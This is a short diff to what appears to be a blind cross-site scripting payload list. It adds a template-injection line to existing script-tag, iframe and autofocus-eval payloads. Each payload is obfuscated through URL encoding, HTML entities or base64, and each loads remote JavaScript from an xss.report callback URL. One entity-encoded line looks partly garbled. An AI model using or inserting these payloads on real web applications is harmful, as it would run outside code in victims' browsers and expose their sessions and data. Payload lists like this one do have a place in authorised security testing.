@@ -2,3 +2,4 @@
 '%22%3E%3Cscript%20src=https://xss.report/c/hnterx%3E%3C/script%3E
 "><iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;https://xss.report/c/hnterx&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;">
 %2522%253E%253Cinput%2520onfocus%3Deval%28atob%28this.id%29%29%2520id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs%26%2361%3B%2520autofocus%253E
+{{constructor.constructor('eval(atob(\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsmIzYxOyYjNjE=\'))')()}}
